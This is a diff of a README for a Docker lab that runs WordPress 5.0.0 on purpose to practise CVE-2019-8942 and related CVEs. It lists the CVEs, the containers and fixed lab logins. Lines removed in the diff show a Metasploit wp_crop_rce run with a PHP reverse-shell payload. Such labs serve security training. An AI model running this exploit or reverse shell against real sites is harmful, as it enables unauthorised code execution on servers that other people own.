@@ -1,62 +1,77 @@
-# WordPress CVE Exploitation Lab - Complete Guide
+# WordPress 5.0.0 — CVE-2019-8942 / CVE-2019-8943 Lab + Full CVE Guide
 
-> **WARNING:** For educational and authorized security testing only. Run in isolated environments only.
+> **WARNING:** This lab runs an intentionally vulnerable WordPress instance and weakens several security defaults. Run it on a trusted host / isolated network only. Do not expose ports to the internet. For education and authorised security testing only.
 
-## Target CVEs
+## Overview
 
-| CVE | CVSS | Severity | RCE | Vulnerable WP Version | Fixed | Exploitation Difficulty |
-|-----|------|----------|-----|----------------------|-------|-------------------------|
-| [CVE-2019-8942](#cve-2019-8942) | 8.8 | HIGH | YES | 5.0.0 | 5.0.1 | Medium (Auth Required - Author+) |
-| [CVE-2019-9787](#cve-2019-9787) | 7.3 | HIGH | YES | < 5.1.1 | 5.1.1 | Hard (CSRF + XSS Chain) |
-| [CVE-2020-28037](#cve-2020-28037) | 7.1 | HIGH | NO* | < 5.5.2 | 5.5.2 | Medium (Unauth) |
-| [CVE-2020-28038](#cve-2020-28038) | 6.4 | MEDIUM | NO | < 5.5.2 | 5.5.2 | Medium |
-| [CVE-2020-28039](#cve-2020-28039) | 6.1 | MEDIUM | NO | < 5.5.2 | 5.5.2 | Medium (Auth) |
-| [CVE-2021-29447](#cve-2021-29447) | 8.8 | HIGH | YES | < 5.7.1 | 5.7.1 | Medium (Auth - Author+) |
-| [CVE-2021-29504](#cve-2021-29504) | 4.3 | MEDIUM | NO | < 5.7.2 | 5.7.2 | Easy (Auth) |
-| [CVE-2022-21661](#cve-2022-21661) | 8.8 | HIGH | NO** | < 5.8.3 | 5.8.3 | Easy (Unauth) |
-| [CVE-2022-21662](#cve-2022-21662) | 8.8 | HIGH | YES | < 5.8.3 | 5.8.3 | Hard (Auth + Gadget Chain) |
-| [CVE-2022-21663](#cve-2022-21663) | 6.1 | MEDIUM | NO | < 5.8.3 | 5.8.3 | Medium (Auth) |
-| [CVE-2022-21664](#cve-2022-21664) | 7.1 | HIGH | NO | < 5.8.3 | 5.8.3 | Medium (Auth/Unauth) |
+A reproducible Docker Compose lab for multiple WordPress CVEs. The original working lab is for the authenticated RCE chain in WordPress **5.0.0**, with all additional CVEs documented below with exploitation steps and payloads.
 
-\* Can lead to reinstallation/RCE in specific conditions  
-\*\* SQLi can lead to credential extraction, potentially leading to RCE
+Discovered/Referenced:
+- CVE-2019-8942 / CVE-2019-8943: RIPSTECH - [WordPress Image Remote Code Execution](https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/)
 
-## Lab Setup
+This repository includes intentional misconfigurations (enabled XML-RPC/pingbacks, public `debug.log`, missing `X-Frame-Options`) for enumeration practice.
 
-### Current Working Lab (CVE-2019-8942)
+## CVE Coverage
+
+| CVE | CVSS | Severity | RCE CLASS | Vulnerable WP Version | Fixed In | Description |
+|-----|------|----------|-----------|----------------------|----------|-------------|
+| [CVE-2019-8942](#cve-2019-8942--cve-2019-8943) | 8.8 | HIGH | YES | 5.0.0 | 5.0.1 | Arbitrary file upload/RCE via attachment metadata + image crop |
+| [CVE-2019-9787](#cve-2019-9787) | 7.3 | HIGH | YES | < 5.1.1 | 5.1.1 | CSRF leading to XSS to RCE via comment manipulation |
+| [CVE-2020-28037](#cve-2020-28037) | 7.1 | HIGH | — | < 5.5.2 | 5.5.2 | is_blog_installed check bypass - can trigger reinstallation |
+| [CVE-2020-28038](#cve-2020-28038) | 6.4 | MEDIUM | — | < 5.5.2 | 5.5.2 | Unfiltered HTML in post excerpts causing issues |
+| [CVE-2020-28039](#cve-2020-28039) | 6.1 | MEDIUM | — | < 5.5.2 | 5.5.2 | is_protected_meta allows arbitrary file deletion |
+| [CVE-2021-29447](#cve-2021-29447) | 8.8 | HIGH | YES | < 5.7.1 | 5.7.1 | XXE in WAV media import via crafted files |
+| [CVE-2021-29504](#cve-2021-29504) | 4.3 | MEDIUM | — | < 5.7.2 | 5.7.2 | Stored XSS via post metadata |
+| [CVE-2022-21661](#cve-2022-21661) | 8.8 | HIGH | — | < 5.8.3 | 5.8.3 | SQL injection in WP_Query taxonomy handling |
+| [CVE-2022-21662](#cve-2022-21662) | 8.8 | HIGH | YES | < 5.8.3 | 5.8.3 | Object injection via unescaped metadata leading to RCE |
+| [CVE-2022-21663](#cve-2022-21663) | 6.1 | MEDIUM | — | < 5.8.3 | 5.8.3 | Authenticated Stored XSS in block editor |
+| [CVE-2022-21664](#cve-2022-21664) | 7.1 | HIGH | — | < 5.8.3 | 5.8.3 | Object injection via WP_Term_Query |
+
+## Stack
+
+| Service     | Image                    | Purpose                                  |
+|-------------|--------------------------|------------------------------------------|
+| `db`        | `mysql:5.7`              | Database                                 |
+| `wordpress` | `wordpress:5.0.0`        | Vulnerable app, published on port `18180` |
+| `setup`     | `wordpress:cli-php7.2`   | Installs WP, creates users, applies lab config |
+| `cli`       | `wordpress:cli-php7.2`   | On-demand WP-CLI (`--profile cli`)       |
+
+Credentials created by `setup.sh`:
+
+| Role   | Username | Password         |
+|--------|----------|------------------|
+| Admin  | `admin`  | `AdminPass123!`  |
+| Author | `author` | `AuthorPass123!` |
+
+## Requirements
+
+- Docker + Docker Compose v2
+- `curl` (for check/enumeration scripts)
+- Optional: `jq`
+- Optional: Metasploit Framework (`msfconsole`)
+
+## Quick start (CVE-2019-8942 Lab)
+
 ```bash
-cd ~/wp-cve-all/docker/cve-2019-8942
+git clone https://github.com/helfgottje-0118/wp-cve.git
+cd wp-cve
+
+# Start the lab
 docker compose up -d
-# Wait for setup
-sleep 60
+# or use make
+make up
 ```
-- URL: http://localhost:18180
-- Admin: admin / AdminPass123!
-- Author: author / AuthorPass123!
 
-## Exploitation Steps
+Wait for setup to finish:
 
-### CVE-2019-8942
-**Type:** Authenticated RCE via Image Crop  
-**Auth:** Author+ required  
-**Impact:** Remote Code Execution as www-data
-
-#### Method 1: Metasploit (Easiest)
 ```bash
-cd ~/wp-cve-all
-./scripts/exploit.sh
-# OR manually
-msfconsole -q
-use exploit/multi/http/wp_crop_rce
-set RHOSTS 127.0.0.1
-set RPORT 18180
-set USERNAME author
-set PASSWORD AuthorPass123!
-set THEME_DIR twentynineteen
-set LHOST 172.24.0.1
-set PAYLOAD php/reverse_php
-run
+docker compose logs -f setup     # look for "setup] done"
+./scripts/check.sh
 ```
+
+Browse to [http://localhost:18180/wp-admin](http://localhost:18180/wp-admin) and log in as `author` / `AuthorPass123!`.
+
+> If accessing from another machine, set `WP_URL=http://<host-ip>:18180` in `.env` before first boot or `docker compose down -v && docker compose up -d` after changing.
 
 #### Method 2: Manual with polyglot
 ```bash
